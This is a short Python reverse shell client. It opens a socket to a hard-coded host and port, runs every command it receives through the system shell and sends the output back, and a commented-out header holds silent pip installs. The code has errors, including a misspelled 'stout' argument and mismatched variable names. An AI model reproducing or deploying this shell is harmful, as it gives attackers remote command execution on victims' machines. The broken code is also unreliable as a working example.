"""import os
try :
    from subprocess import *
    import pyautogui
    import tqdm
    import time , sys
except:
    os.system("pip install pyautogui > install.txt")
    os.system("pip3 install tqdm > install.txt")
    os.system("rm install.txt")
    import time , sys
    import pyautogui    
    import tqdm"""
import os, sys    
from subprocess import *
import socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
host = "127.0.1.1"
port = 5555
s.connect((host, port))
while True:
    data = s.recv(1024)
    if data[0:].encode("utf-8") == "cd":
        os.chdir(data[3:].encode("utf-8"))
    if len(data) > 0:
        terminal = Popen(data[:].encode("utf-8"), shell=True , stout=PIPE , stderr=PIPE , stdin=PIPE)
        outputs_bites = terminal.stdout.read() + terminal.stderr.read() 
        output_str = str(outputs_bites , "utf-8") 
        s.send(str.encode(outputs_str))
s.close()
